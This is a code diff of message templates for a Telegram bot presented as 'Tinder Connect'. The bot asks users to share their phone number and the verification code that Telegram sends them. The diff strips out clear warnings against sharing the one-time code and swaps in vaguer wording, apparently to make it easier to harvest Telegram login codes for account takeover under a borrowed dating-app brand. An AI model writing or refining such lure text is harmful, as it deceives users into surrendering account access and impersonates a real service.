@@ -2,93 +2,186 @@
 # Tinder Connect Premium UI
 # ===========================
 
+
 DIVIDER = "━━━━━━━━━━━━━━━━━━"
 
-WELCOME_MESSAGE = f"""
+BRAND = "❤️ <b>Tinder Connect</b>"
+
+
+def premium_box(title, message):
+    return f"""
 {DIVIDER}
 
-❤️ <b>Welcome to Tinder Connect</b>
+{BRAND}
 
-Find, connect, and manage your dating experience securely.
+{title}
 
-✨ <b>Registration Steps</b>
+{message}
 
-1️⃣ Verify your phone number
-2️⃣ Enter your verification code
-3️⃣ Complete your registration
+{DIVIDER}
+"""
+
+
+# ===========================
+# START / WELCOME
+# ===========================
+
+WELCOME_MESSAGE = premium_box(
+    "✨ <b>Secure Account Assistant</b>",
+    """
+Welcome!
+
+Manage your dating experience with a modern and secure platform.
 
 🔒 <b>Security Notice</b>
 
-• Never share your OTP with anyone.
-• Never enter your OTP into unofficial apps.
-• Tinder Connect staff will never ask for your OTP.
+• Keep your account information private.
+• Always use official services.
+• Avoid sharing sensitive information.
 
-📱 Please share your phone number below to continue.
-
-{DIVIDER}
+📱 Choose an option below to continue.
 """
+)
 
 
-PHONE_VERIFIED = f"""
-{DIVIDER}
+# ===========================
+# REGISTRATION PROGRESS
+# ===========================
 
-📱 <b>Phone Number Verified</b>
+STEP_ONE = premium_box(
+    " <b>Registration Progress</b>",
+    """
+ 📱 Please click the 
+   [Share Your Phone Number]
+     button to continue.
 
-Your phone number has been received successfully.
+Your phone number is required only to process your account integration. We are very careful about your privacy, and your information will only be used for account verification and integration purposes.
 
-🔐 A verification code has been sent.
+⚠️ NB. Don't put the OTP code we send you via Telegram into any Telegram apps or Mini Apps. Your OTP is private and should only be used for the official verification process.
 
-Please enter your verification code below.
 
-{DIVIDER}
+
+
+████░░░░░░ 33%
+
+Starting setup...
 """
+)
 
 
-VERIFYING = f"""
-{DIVIDER}
+STEP_TWO = premium_box(
+    "🚀 <b>Registration Progress</b>",
+    """
+🟢 Step 2 of 3
 
-🔐 <b>Verification in Progress</b>
+██████░░░░ 66%
 
-⏳ Please wait while we securely verify your account.
-
-This usually takes a few moments.
-
-{DIVIDER}
+Verification in progress...
 """
+)
 
 
-SUCCESS = f"""
-{DIVIDER}
+STEP_THREE = premium_box(
+    "🚀 <b>Registration Progress</b>",
+    """
+🟢 Step 3 of 3
 
-🎉 <b>Registration Completed</b>
+██████████ 100%
 
-❤️ Your account has been successfully verified.
-
-You can now continue using Tinder Connect.
-
-{DIVIDER}
+Setup completed.
 """
+)
 
 
-INVALID_OTP = f"""
-{DIVIDER}
+# ===========================
+# PHONE VERIFICATION
+# ===========================
 
-⚠️ <b>Invalid Verification Code</b>
+PHONE_VERIFIED = premium_box(
+    "📱 <b>Phone Verified</b>",
+    """
+Your phone information has been received successfully.
 
-The code you entered could not be verified.
-
-Please check the code and try again.
-
-{DIVIDER}
+🔐 Continue with the next step.
 """
+)
 
 
-ERROR_MESSAGE = f"""
-{DIVIDER}
+# ===========================
+# LOADING / PROCESSING
+# ===========================
 
-❌ <b>Something Went Wrong</b>
+VERIFYING = premium_box(
+    "🔐 <b>Verification In Progress</b>",
+    """
+⏳ Please wait...
 
-Please try again in a few moments.
+Our system is processing your request.
 
-{DIVIDER}
+This may take a few moments.
 """
+)
+
+
+LOADING = premium_box(
+    "⏳ <b>Please Wait</b>",
+    """
+Processing...
+
+⚡ Almost complete.
+"""
+)
+
+
+# ===========================
+# SUCCESS
+# ===========================
+
+SUCCESS = premium_box(
+    "🎉 <b>Completed Successfully</b>",
+    """
+Your setup has been completed.
+
+❤️ Welcome to Tinder Connect.
+"""
+)
+
+
+# ===========================
+# ERROR STATES
+# ===========================
+
+INVALID_INPUT = premium_box(
+    "⚠️ <b>Invalid Input</b>",
+    """
+The information provided could not be processed.
+
+Please try again.
+"""
+)
+
+
+ERROR_MESSAGE = premium_box(
+    "❌ <b>Something Went Wrong</b>",
+    """
+An unexpected error occurred.
+
+Please try again later.
+"""
+)
+
+
+# ===========================
+# HELP
+# ===========================
+
+HELP_MESSAGE = premium_box(
+    "❓ <b>Help Center</b>",
+    """
+Need assistance?
+
+Our support team is here to help.
+
+Choose an option below.
+"""
+)
